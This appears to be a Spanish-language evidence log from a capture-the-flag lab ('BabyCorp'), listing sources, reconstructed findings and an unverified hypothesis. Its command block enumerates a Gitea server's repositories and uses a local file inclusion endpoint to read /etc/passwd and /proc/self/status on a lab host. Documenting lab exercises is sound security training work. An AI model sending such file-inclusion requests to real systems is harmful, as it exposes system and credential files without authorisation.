---
tags: [ctf, thehackerslabs, linux, evidencias, lfi]
tipo: evidencias
---

# BabyCorp — Evidencias

> [!warning] Origen
> Basado en [[BabyCorp - Writeup]] (evidencia original del propio laboratorio, 2026-10-19). Comandos y fragmentos de código reproducidos tal cual.

## Originales

| # | Tipo | Descripción | Ruta | Origen |
|---|---|---|---|---|
| 1 | md | Writeup original | `01-CTF/TheHackersLabs/BabyCorp/BabyCorp - Writeup.md` | sesión original |
| 2 | código | `app.py` de `wvverez/BabyCorp-Web-Project` | repo Gitea + `~/BabyCorp-Web-Project` | clonado |

## Reconstrucciones

| # | Qué | Base |
|---|---|---|
| 1 | Tabla de puertos/servicios | salida de `nmap -sS -sV -p-` |
| 2 | `Uid: 0` del servicio Flask | `/proc/self/status` vía LFI |

## Inferencias (no verificadas)

- Que el puerto `9000` (`jump`) sea un reto de pwn alternativo: **hipótesis**, no verificado.

## Comandos clave reproducibles

```bash
curl -s "http://192.168.56.102:3000/api/v1/repos/search?limit=50"
git clone http://192.168.56.102:3000/wvverez/BabyCorp-Web-Project.git
curl -s http://192.168.56.102:5000/api/load-file --data-urlencode "file=/etc/passwd"
./lfi.sh /proc/self/status | grep Uid
```

## Artefactos generados

| Artefacto | Ruta | Notas |
|---|---|---|
| `lfi.sh` | local | helper de lectura (desechable) |
| `BabyCorp-Web-Project` | `~/BabyCorp-Web-Project` | repo clonado (proyecto original, **no modificar**) |
